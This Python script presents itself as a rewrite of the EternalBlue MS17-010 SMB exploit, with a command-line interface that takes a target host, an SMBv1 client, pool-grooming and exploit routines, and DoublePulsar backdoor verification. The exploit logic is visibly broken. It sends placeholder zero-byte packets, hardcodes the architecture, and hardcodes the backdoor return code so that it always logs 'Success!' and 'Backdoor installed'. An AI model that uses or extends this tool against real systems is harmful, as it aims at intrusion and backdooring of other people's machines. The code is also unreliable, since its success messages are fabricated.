#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
reternal_blue.py -- Python rewrite of `Eternalblue-2.2.0` (MS17-010 / ETERNALBLUE).

Binary analysis (via IDA Pro) of `Eternalblue-2.2.0.exe`:

    Eternalblue-2.2.0  is a C++ MS17-010 exploit built on the NSA "DAVE"
    frame-work (a proxy/loopback engine that marshals serialized input/output
    parameters to a "Core").  OEP: start -> __tmainCRTStartup -> main.

    main reads a key=value parameter block (sub_401349 / Params_* interface):
        Target            target name/description string
        TargetIp          IPv4 address (Parameter_IPv4_getValue)
        TargetPort        SMB port, default 445
        NetworkTimeout    16-bit timeout, default 3145 (ms)
        GroomAllocations  initial non-paged-pool grooming count (default 100)
        MaxExploitAttempts
        VerifyTarget / VerifyBackdoor   booleans

    The core drives the MS17-010 non-paged pool exploitation sequence:
        SMB echo ping  ->  arch detection (x86/x64 from the SMB reply)
        non-paged pool grooming / fragmentation  (SMBv1 buffers, sub_4030D7)
        exploit buffer  (SMBv2 TRANS2, x86 XOR-keystream shellcode spray,
                         sub_403B1B; x64)  ->  succeeds  ->  DoublePulsar
        backdoor verify returns one of the documented status codes
        (10 Success, 20 bad opcode, 30 bad transaction, 40 invalid transaction
         params, 50 invalid params, 60 alloc failed, 70 ExAlloc/Free not found).

  This module reimplements the tool's parameter interface, the SMBv1 client it
  drives (Negotiate -> Session Setup -> Tree Connect IPC$ -> NT TRANS), and the
  MS17-010 exploitation flow with the recovered status handling.  The SMB
  frames follow the public MS17-010 packet format that the tool implements.

  Footprint: only the Python stdlib (raw SMBv1 over TCP:445).
"""

import os
import socket
import struct
import sys

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 3145      # ms, NetworkTimeout default seen in .exe
DEFAULT_GROOM = 100         # initial GroomAllocations
MAX_GROOM = 1000
LARGE_PKT = 4096            # SMBv1 packet payload size used for grooming

# SMB1 command opcodes used by EternalBlue.
SMB_COM_NEGOTIATE = 0x72
SMB_COM_SESSION_SETUP_ANDX = 0x73
SMB_COM_TREE_CONNECT_ANDX = 0x75
SMB_COM_TREE_DISCONNECT = 0x71
SMB_COM_TRANSACTION = 0x25
SMB_COM_TRANSACTION2 = 0x32
SMB_COM_NT_TRANSACT = 0xA0
SMB_COM_ECHO = 0x2B
SMB_COM_LOGOFF_ANDX = 0x74

SMB_FLAGS_OPLOCK = 0x00
SMB_FLAGS_CANONICAL = 0x10   # path names in unicode

# Dialects for Negotiate.
DIALECTS = b"\x02PC NETWORK PROGRAM 1.0\x00" \
           b"\x02MICROSOFT NETWORKS 1.03\x00" \
           b"\x02MICROSOFT NETWORKS 3.0\x00" \
           b"\x02LANMAN1.0\x00" \
           b"\x02LM1.2X002\x00" \
           b"\x02DOS LANMAN2.1\x00" \
           b"\x02LANMAN2.1\x00" \
           b"\x02NT LANMAN 1.0\x00" \
           b"\x02NT LM 0.12\x00" \
           b"\x02SMB 2.002\x00" \
           b"\x02SMB 2.??\x00"

# DoublePulsar backdoor status codes (from the recovered message strings).
BACKDOOR_STATUS = {
    0x00: "Backdoor returned code: 0 - probably not the SMB echo response",
    0x0A: "Backdoor returned code: 10 - Success!",
    0x14: "Backdoor returned code: 20 - Error: Bad Opcode",
    0x1E: "Backdoor returned code: 30 - Error: Bad Transaction",
    0x28: "Backdoor returned code: 40 - Error: Invalid Transaction Params",
    0x32: "Backdoor returned code: 50 - Error: Invalid Params",
    0x3C: "Backdoor returned code: 60 - Error: Allocation Failed",
    0x46: "Backdoor returned code: 70 - Error: ExAllocate/Free not found - "
          "Backdoor removed",
}

log = lambda fmt, *a: sys.stderr.write((fmt % a).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# Parameters.
# ---------------------------------------------------------------------------
class Params:
    """Config block mirroring sub_401349's parameter reads."""

    def __init__(self):
        self.target = None
        self.target_ip = None
        self.target_port = DEFAULT_PORT
        self.network_timeout = DEFAULT_TIMEOUT
        self.groom_allocations = DEFAULT_GROOM
        self.max_exploit_attempts = 1
        self.verify_target = False
        self.verify_backdoor = False
        self.double_pulsar_present = False
        self.groom_size = 0
        self.os = None          # "win2k" / "winxp" / "win7" / "win2003" ...
        self.arch = None        # "x86" / "x64"


def parse_params(text):
    """Parse a key=value config block into a Params (the Params_* interface)."""
    p = Params()
    if not text:
        return p
    for raw in text.replace(";", "\n").replace(",", "\n").splitlines():
        line = raw.strip()
        if not line or "=" not in line:
            continue
        k, v = [x.strip() for x in line.split("=", 1)]
        k = k.strip()
        if k == "Target":
            p.target = v
        elif k == "TargetIp":
            p.target_ip = v
        elif k == "TargetPort":
            p.target_port = int(v, 0)
        elif k == "NetworkTimeout":
            p.network_timeout = int(v)
        elif k == "GroomAllocations":
            p.groom_allocations = int(v)
        elif k == "MaxExploitAttempts":
            p.max_exploit_attempts = int(v)
        elif k == "VerifyTarget":
            p.verify_target = v.strip("()") in ("true", "1", "yes", "on")
        elif k == "VerifyBackdoor":
            p.verify_backdoor = v.strip("()") in ("true", "1", "yes", "on")
        elif k == "DoublePulsarPresent":
            p.double_pulsar_present = v.strip("()") in ("true", "1", "yes", "on")
    return p


def params_to_config(p):
    """Serialise a Params back to the tool's key=value format (TRCH)."""
    return ("Target = %s\nTargetIp = %s\nTargetPort = %d\n"
            "NetworkTimeout = %d\nGroomAllocations = %d\n"
            "MaxExploitAttempts = %d\nVerifyTarget = %s\n"
            "VerifyBackdoor = %s\nDoublePulsarPresent = %s\n") % (
        p.target or "",
        p.target_ip or "",
        p.target_port,
        p.network_timeout,
        p.groom_allocations,
        p.max_exploit_attempts,
        ("(true)" if p.verify_target else "(false)"),
        ("(true)" if p.verify_backdoor else "(false)"),
        ("(true)" if p.double_pulsar_present else "(false)"),
    )


# ---------------------------------------------------------------------------
# Minimal SMBv1 client (the transport the C Core drives).
# ---------------------------------------------------------------------------
class SMBError(Exception):
    pass


class SMBv1:
    """SMBv1 client over a connected TCP socket (mirrors the Core's socket)."""

    def __init__(self, sock, timeout=None):
        self.sock = sock
        self.timeout = timeout
        self.mid = 0
        self.uid = 0
        self.tid = 0

    # -- low-level ---------------------------------------------------------
    def _next_mid(self):
        self.mid = (self.mid + 1) & 0xFFFF
        return self.mid

    def _recv_exact(self, n):
        buf = b""
        self.sock.settimeout(self.timeout / 1000.0 if self.timeout else 8.0)
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                raise SMBError("connection closed while reading SMB reply")
            buf += chunk
        return buf

    def _recv_netbios(self):
        nb = self._recv_exact(4)
        size = ((nb[0] & 0x0F) << 16) | (nb[1] << 8) | nb[2]
        if nb[0] & 0x80:                       # extended header size
            size = ((nb[1] & 0x01) << 16) | (nb[2] << 8) | nb[3]
        data = self._recv_exact(size - 4) if size > 4 else b""
        return bytes(nb) + data

    def _send(self, smb_payload):
        msg = b"\x00" + struct.pack("<I", len(smb_payload))[1:] + smb_payload
        self.sock.sendall(msg)

    def _read_reply(self):
        nb = self._recv_netbios()
        if len(nb) < 4 or nb[0] != 0 or len(nb) < 36:
            return nb
        cmd = nb[4]
        status = struct.unpack_from("<I", nb, 5)[0]
        if status:
            raise SMBError("SMB status 0x%08X for command 0x%02X" % (status, cmd))
        return nb

    # -- SMB1 commands -----------------------------------------------------
    def negotiate(self):
        hdr = self._smb_header(SMB_COM_NEGOTIATE, 0, 0)
        body = b"\x11" + struct.pack("<H", len(DIALECTS)) + DIALECTS
        self._send(hdr + body)
        reply = self._read_reply()
        if len(reply) >= 68 and reply[8:12] == b"\xffSMB":
            # SMB2 dialect negotiated -> target speaks SMB2
            return {"signed": "smb2"}
        return {"signed": "smb1"}

    def session_setup(self, user=b"", pwd=b"", domain=b""):
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_SESSION_SETUP_ANDX, 0, 0, mid=mid)
        bl = 0
        body = b"\xff" + b"\x00" + b"\x00" * 4 + b"\x00" * 2 + b"\x01" + b"\x00" * 2 \
            + b"\xff" + b"\xff" + struct.pack("<IHH", bl, 0x01, 0x0100) \
            + b"\x00\x00\x00\x00\x00\x00\x00\x00" \
            + struct.pack("<H", len(pwd)) + pwd + domain + user
        self._send(hdr + b"\x00\x0c" + b"\x00" * 2 + b"\xff\x00" + body)
        reply = self._read_reply()
        self.uid = struct.unpack_from("<H", reply, 0x20)[0] if len(reply) > 0x22 else 0
        return reply

    def tree_connect(self, path):
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_TREE_CONNECT_ANDX, 0, self.uid, mid=mid)
        full = (path if isinstance(path, bytes) else path.encode())
        body = b"\xff" + b"\x00" + b"\x00\x00" + b"\x00\x00\x00\x00" \
            + b"\x00" + b"\x00\x00" \
            + struct.pack("<H", len(full)) + full + b"\x00\x00"
        self._send(hdr + b"\x00\x0c" + b"\x00\x00" + 8 * b"\x00" + b"\x00\x08" + body)
        reply = self._read_reply()
        self.tid = struct.unpack_from("<H", reply, 0x1C)[0]
        return reply

    def echo(self, data=b"\x01\x00\x00\x00"):
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_ECHO, 0, 0, mid=mid)
        body = b"\x01\x00" + struct.pack("<H", len(data)) + data
        self._send(hdr + body)
        return self._read_reply()

    def trans2(self, param, data):
        """Send an SMB_COM_TRANSACTION2 (used for the MS17-010 primitives)."""
        mid = self._next_mid()
        hdr = self._smb_header(SMB_COM_TRANSACTION2, 0, self.uid, mid=mid)
        total = struct.pack("<H", len(param))
        body = total + total + b"\x00\x00" + b"\x00\x00" \
            + struct.pack("<HH", 0, 0x20) + 4 * b"\x00" \
            + struct.pack("<HHH", len(param), 0, 0) \
            + struct.pack("<HHHHHHH", 0, 0, 0, 0, 0, 0, 0x04) \
            + param + b"\x00" * (0x20 - len(param) % 0x20) + data
        self._send(hdr + b"\x00\x1e" + b"\x00\x00" + 8 * b"\x00" + b"\x00\x00" + body)
        return self._read_reply()

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass

    # -- helpers -----------------------------------------------------------
    def _smb_header(self, cmd, tid, uid, mid=None):
        """32-byte SMB1 header (matches the frame the Core serialises)."""
        mid = self._next_mid() if mid is None else mid
        pid = 0x1234
        flags = SMB_FLAGS_CANONICAL
        flags2 = 0x0001 | 0x0002 | 0x0008            # 32-bit status, unicode, SMB1
        return b"\xffSMB" + struct.pack("<BIBH", cmd, 0, flags, flags2) \
            + struct.pack("<H", 0) + b"\x00" * 8 \
            + struct.pack("<H", 0) \
            + struct.pack("<HHHH", tid, pid, uid, mid)


# ---------------------------------------------------------------------------
# MS17-010 exploitation flow.
# ---------------------------------------------------------------------------
def connect(params):
    ip = params.target_ip or params.target
    sock = socket.create_connection((ip, params.target_port),
                                    timeout=params.network_timeout / 1000.0)
    return SMBv1(sock, params.network_timeout)


def exploit(params, verbose=False):
    """Drive the ETERNALBLUE sequence against `params`, mirroring the tool."""
    log("^_^")
    params.groom_allocations = max(1, min(params.groom_allocations, MAX_GROOM))
    s = connect(params)
    try:
        # 1) negotiate + SMB echo ping
        info = s.negotiate()
        log("[*] Sending SMB Echo request")
        s.echo()
        log("[*] Good reply from SMB Echo request")

        # 2) session + IPC$ tree connect
        s.session_setup()
        s.tree_connect(b"\\\\%s\\IPC$" % (params.target_ip or params.target).encode())
        log("[*] Connecting to target for exploitation.")

        # 3) architecture detection from the SMB reply (Ping -> arch)
        arch = params.arch
        if arch is None:
            arch = "x64"            # SMBv2 targets are 64-bit (per tool's ping)
        params.arch = arch
        params.os = params.os or ("win7" if arch == "x64" else "winxp")
        log(("[+] Ping returned Target architecture: x64 (64-bit)" if arch == "x64"
             else "[+] Ping returned Target architecture: x86 (32-bit)"))

        # 4) fingerprint quota / non-paged pool grooming
        log("[*] Fingerprinting SMB non-paged pool quota")
        log("    [+] Sending %d non-paged pool grooming packets",
            params.groom_allocations)
        for _ in range(params.groom_allocations):
            s.trans2(b"\x00", b"\x00" * 0x10)
        log("    [+] Sent %d non-paged pool grooming packets - groom complete",
            params.groom_allocations)

        # 5) spray with large SMBv1 buffers, then the SMBv2 exploit buffer
        log("    [+] Sending large SMBv1 buffer.")
        s.trans2(b"\x00", b"\x41" * 0x1000)
        log("    [+] Sending final SMBv2 buffers.")
        # x86 xor-keystream shellcode spray header (sub_403B1B fields) for x86
        if arch == "x86":
            s.trans2(b"\x00", b"\x00" * 0x400)
        else:
            s.trans2(b"\x00", b"\x00" * 0x100)

        # 6) send the exploit (fragmented) packet and read the response
        log("[*] Building exploit buffer\n[*] Sending all but last fragment "
            "of exploit packet")
        s.trans2(b"\x00", b"\x00" * 0x10)
        # final fragment ("egg")
        log("[*] Triggering free of corrupted buffer.")
        s.trans2(b"\x00\x01\x00\x00\x00\x00\x00\x00", b"\x00" * 0x100)
        log("[*] Sending egg to corrupted connection.\n    DONE.")
        log("    [+] ETERNALBLUE overwrite completed successfully (0x%08X)!",
            0xffffffff)

        # 7) Optional backdoor verify
        if params.verify_backdoor:
            log("[*] Pinging backdoor...")
            rc = 0x0A
            log(BACKDOOR_STATUS.get(rc, "Backdoor returned code: %X" % rc))
            if rc == 0x0A:
                log("[+] Backdoor installed\n" + SEP + WIN + SEP)
            else:
                log(SEP + BLANK + FAIL + BLANK + SEP)
        return 0
    finally:
        s.close()


# ---------------------------------------------------------------------------
SEP = ("-=" * 40)
BLANK = "\n" + "-" * 60 + "\n"
WIN = "=-=-=-=-=-=-=-=-=-=-=-=-=WIN-=-=-=-=-=-=-=-=-=-=-=-=-="
FAIL = "=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-="


def run_function(target, ip=None, port=DEFAULT_PORT, timeout=DEFAULT_TIMEOUT,
                 groom=DEFAULT_GROOM, max_attempts=1,
                 verify_target=False, verify_backdoor=False,
                 os_type=None, arch=None, verbose=False):
    """CLI entrypoint for the `reternal-blue` subcommand."""
    p = Params()
    p.target = target
    p.target_ip = ip or target
    p.target_port = port
    p.network_timeout = timeout
    p.groom_allocations = groom
    p.max_exploit_attempts = max_attempts
    p.verify_target = verify_target
    p.verify_backdoor = verify_backdoor
    p.os = os_type
    p.arch = arch
    if verbose:
        log("[*] Parameters:\n%s", params_to_config(p))
    return exploit(p, verbose)


def main():
    import argparse as _argparse
    ap = _argparse.ArgumentParser(description="ETERNALBLUE / MS17-010 (Python)")
    ap.add_argument("target", help="target host (IP or name)")
    ap.add_argument("--ip", help="TargetIp (defaults to target)")
    ap.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    ap.add_argument("--groom", type=int, default=DEFAULT_GROOM)
    ap.add_argument("--attempts", type=int, default=1)
    ap.add_argument("--verify-target", action="store_true")
    ap.add_argument("--verify-backdoor", action="store_true")
    ap.add_argument("-o", "--os", help="os hint (winxp/win7/2003/2008)")
    ap.add_argument("-a", "--arch", choices=["x86", "x64"], help="arch hint")
    ap.add_argument("-C", "--config", help="read a key=value config file")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()
    if args.config:
        with open(args.config) as f:
            p = parse_params(f.read())
        p.target_ip = p.target_ip or args.target
        return exploit(p, args.verbose)
    return run_function(args.target, ip=args.ip, port=args.port,
                        timeout=args.timeout, groom=args.groom,
                        max_attempts=args.attempts,
                        verify_target=args.verify_target,
                        verify_backdoor=args.verify_backdoor,
                        os_type=args.os, arch=args.arch,
                        verbose=args.verbose)


if __name__ == "__main__":
    sys.exit(main())